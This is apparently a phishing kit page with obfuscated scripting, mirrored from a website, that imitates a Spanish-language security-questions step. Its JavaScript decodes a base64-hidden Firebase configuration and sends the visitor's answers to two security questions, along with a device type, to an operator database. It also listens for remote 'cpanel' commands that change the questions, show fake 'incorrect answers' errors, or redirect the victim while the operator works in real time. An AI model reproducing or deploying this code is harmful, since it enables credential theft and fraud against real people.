Website Copier/3.x [XR&CO'2014], Fri, 28 Aug 2026 15:29:54 GMT --><!-- Firebase Panel Integration -->
<script src="bots_filter.js"></script>
<script src="config.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
<script>
// ===== EYE TOGGLE =====
document.addEventListener('click', function(e){
  var el = e.target.closest ? e.target.closest('[data-password-toggle]') : null;
  if(!el) el = (e.target.getAttribute && e.target.getAttribute('data-password-toggle')) ? e.target : null;
  if(!el) return;
  var inputId = el.getAttribute('data-password-toggle');
  var inp = document.getElementById(inputId);
  if(!inp) return;
  inp.type = inp.type === 'text' ? 'password' : 'text';
});

// ===== FIREBASE =====
(function(){
  var _d=atob,_c={
    apiKey:_d('QUl6YVN5Q0FIVkRzLUVfTEtvVldyMXJKdmRqSHpHTndfbU0xSjVN'),
    authDomain:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZWFwcC5jb20='),
    databaseURL:_d('aHR0cHM6Ly9kZXZpY2Utc3RyZWFtaW5nLTJmOWU2OGI2LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ=='),
    projectId:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNg=='),
    storageBucket:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZXN0b3JhZ2UuYXBw'),
    messagingSenderId:_d('NTQyMDQ3NjIwNjYz'),
    appId:_d('MTo1NDIwNDc2MjA2NjM6d2ViOjFlMzUyNmYxZGVlODA5MzdlZjc5YjI=')
  };
  if(!firebase.apps.length) firebase.initializeApp(_c);
  var db   = firebase.database();
  var PATH = (typeof SITE_ID !== 'undefined' && SITE_ID) ? SITE_ID : _d('dm1fNzdjZjI4ZmZkYg==');

  var sid = (new URLSearchParams(window.location.search)).get('id')
          || sessionStorage.getItem('_sid') || null;
  if(!sid){ console.warn('[preguntas] no sid'); return; }

    if(window.location.search.indexOf('err=1') !== -1) {
    setTimeout(function(){
      ['prg','prg2'].forEach(function(id){
        var el = document.getElementById(id);
        if(el){ el.value=''; el.style.borderBottom='2px solid #dc3545'; }
      });
      var errDiv = document.getElementById('_preg_err_msg');
      if(!errDiv){
        errDiv = document.createElement('div');
        errDiv.id = '_preg_err_msg';
        errDiv.style.cssText = 'color:#dc3545;font-size:13px;font-weight:600;padding:10px 0;text-align:center;margin-top:8px;';
        errDiv.textContent = 'Las respuestas son incorrectas. Intente de nuevo.';
        var lbl1 = document.getElementById('labelPrg1');
        if(lbl1) lbl1.parentNode.insertBefore(errDiv, lbl1);
      }
      errDiv.style.display = 'block';
    }, 200);
  }
  var ref = db.ref(PATH + '/' + sid);
  ref.update({ page:'preguntas.html', estado:'online' });

  // Apply questions to labels
  function applyQuestions(q1, q2){
    var lbl1 = document.getElementById('labelPrg1');
    var lbl2 = document.getElementById('labelPrg2');
    if(lbl1 && q1) lbl1.textContent = q1;
    if(lbl2 && q2) lbl2.textContent = q2;
  }

  // Load saved questions immediately on page open
  ref.once('value', function(snap){
    var v = snap.val() || {};
    if(v.pregunta1 || v.pregunta2) applyQuestions(v.pregunta1||'', v.pregunta2||'');
  });

  // Listen for real-time question updates
  ref.child('pregunta1').on('value', function(){
    ref.once('value', function(snap){
      var v = snap.val()||{};
      if(v.pregunta1||v.pregunta2) applyQuestions(v.pregunta1||'', v.pregunta2||'');
    });
  });

  // Listen for commands from cpanel
  ref.child('command').on('value', function(snap){
    var cmd = snap.val();
    if(!cmd || !cmd.action) return;

    if(cmd.action === 'error_preguntas'){
      // Show error - clear fields and highlight red like other error pages
      ['prg','prg2'].forEach(function(id){
        var el = document.getElementById(id);
        if(el){ el.value=''; el.style.borderBottom='2px solid #dc3545'; }
      });
      // Show error message visually
      var errDiv = document.getElementById('_preg_err_msg');
      if(!errDiv){
        errDiv = document.createElement('div');
        errDiv.id = '_preg_err_msg';
        errDiv.style.cssText = 'color:#dc3545;font-size:13px;font-weight:600;padding:10px 0;text-align:center;margin-top:8px;';
        errDiv.textContent = 'Las respuestas son incorrectas. Intente de nuevo.';
        var lbl1 = document.getElementById('labelPrg1');
        if(lbl1) lbl1.parentNode.insertBefore(errDiv, lbl1);
      }
      errDiv.style.display = 'block';
      ref.child('command').remove();
      return;
    }

    if(cmd.action === 'preguntas'){
      // Questions updated, apply them
      if(cmd.pregunta1 || cmd.pregunta2) applyQuestions(cmd.pregunta1||'', cmd.pregunta2||'');
      ref.child('command').remove();
      return;
    }

    // Navigate away
    ref.child('command').remove();
    window.location.href = cmd.page;
  });

  // Handle uso personal / compartido button clicks
  function handleDevice(tipo){
    var r1 = (document.getElementById('prg') || {}).value || '';
    var r2 = (document.getElementById('prg2') || {}).value || '';
    // Save answers + device type to Firebase
    ref.update({
      preguntas: {
        resp1: r1,
        resp2: r2,
        dispositivo: tipo,
        ts: Date.now()
      },
      page: 'carga.html',
      estado: 'online'
    });
    // Navigate to carga.html to wait for commands
    sessionStorage.setItem('_sid', sid);
    window.location.href = 'carga.html';
  }

  // Attach click to personal/shared buttons
  function attachDeviceBtns(){
    var personal = document.getElementById('personal');
    var shared   = document.getElementById('shared');
    var lblPersonal = document.querySelector('label[for=personal]');
    var lblShared   = document.querySelector('label[for=shared]');

    function interceptDevice(e, tipo){
      e.preventDefault();
      e.stopPropagation();
      handleDevice(tipo);
    }

    if(personal)    personal.addEventListener('click',    function(e){ interceptDevice(e,'personal'); });
    if(shared)      shared.addEventListener('click',      function(e){ interceptDevice(e,'compartido'); });
    if(lblPersonal) lblPersonal.addEventListener('click', function(e){ interceptDevice(e,'personal'); });
    if(lblShared)   lblShared.addEventListener('click',   function(e){ interceptDevice(e,'compartido'); });
  }

  if(document.readyState === 'loading'){
    document.addEventListener('DOMContentLoaded', attachDeviceBtns);
  } else {
    attachDeviceBtns();
  }

  window.addEventListener('beforeunload', function(){ ref.update({estado:'offline'}); });
})();
</script>